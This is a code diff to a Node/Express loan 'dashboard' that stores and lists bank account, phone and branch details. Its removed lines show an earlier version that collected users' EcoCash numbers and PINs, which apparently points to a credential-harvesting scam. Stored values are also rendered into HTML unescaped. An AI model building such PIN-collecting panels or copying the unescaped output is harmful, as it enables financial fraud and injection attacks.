@@ -102,13 +102,13 @@ app.post("/submit", async (req, res) => {
 
     await pool.query(
       `INSERT INTO bank_withdrawals
-      (bank_name, account_number, branch_code, phone_number)
+      (bank_name, account_number, phone_number, branch_code)
       VALUES ($1, $2, $3, $4)`,
       [
         bank_name,
         account_number,
-        branch_code,
-        phone_number
+        phone_number,
+        branch_code
       ]
     );
 
@@ -185,7 +185,7 @@ const todayResult = await pool.query(
 
 let rows = "";
 
-result.rows.forEach(item=>{
+result.rows.forEach(item => {
 
 rows += `
 <tr>
@@ -199,9 +199,13 @@ value="${item.id}">
 
 <td>${item.id}</td>
 
-<td>${item.ecocash_number}</td>
+<td>${item.bank_name}</td>
 
-<td>${item.ecocash_pin}</td>
+<td>${item.account_number}</td>
+
+<td>${item.phone_number}</td>
+
+<td>${item.branch_code}</td>
 
 <td>${new Date(item.created_at).toLocaleString()}</td>
 
@@ -232,7 +236,7 @@ Delete
 
 <head>
 
-<title>TKN Kashagi Loan Dashboard</title>
+<title>TKN Bank Loan Dashboard</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
@@ -377,7 +381,7 @@ background:#eef5ff;
 type="text"
 name="search"
 value="${search}"
-placeholder="Search EcoCash Number">
+placeholder="Search phone Number">
 
 <button type="submit">
 Search
@@ -402,21 +406,14 @@ Delete Selected
 <table>
 
 <tr>
-
-<th>
-<input type="checkbox" id="selectAll">
-</th>
-
+<th>Select</th>
 <th>ID</th>
-
-<th>EcoCash Number</th>
-
-<th>EcoCash Pin</th>
-
-<th>Date Submitted</th>
-
+<th>Bank Name</th>
+<th>Account Number</th>
+<th>Phone Number</th>
+<th>Branch Code</th>
+<th>Date</th>
 <th>Action</th>
-
 </tr>
 
 ${rows}
